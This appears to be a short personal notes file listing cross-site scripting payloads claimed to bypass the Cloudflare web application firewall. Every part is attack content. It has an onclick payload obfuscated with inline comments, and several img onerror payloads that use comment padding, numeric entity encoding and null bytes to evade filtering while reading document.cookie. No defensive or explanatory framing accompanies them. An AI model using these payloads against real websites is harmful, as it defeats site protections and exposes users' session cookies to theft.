# NOTAS

XSS bypass Cloudflare WAF 🧱🔥😈
Payload:
```
<a href="#" onclick="var w = window.open/**/(/**/); w.document.write/**/('Hello, world!'/**/); w.document.close/**/(/**/); w.print/**/(/**/); alert/**/('B1P4$$'/**/);">Click me</a>
```

XSS Bypass Waf Cloudflare ;) Poc 
```html
"//>//<img onerror="alert(document.cookie)/***/" src="P"/>
"//>//<img src=P onerror=alert&#0000000040document.cookie)/**/> "
>00%00%00<img onerror="alert(document.cookie)" src="P"/>00%00
```
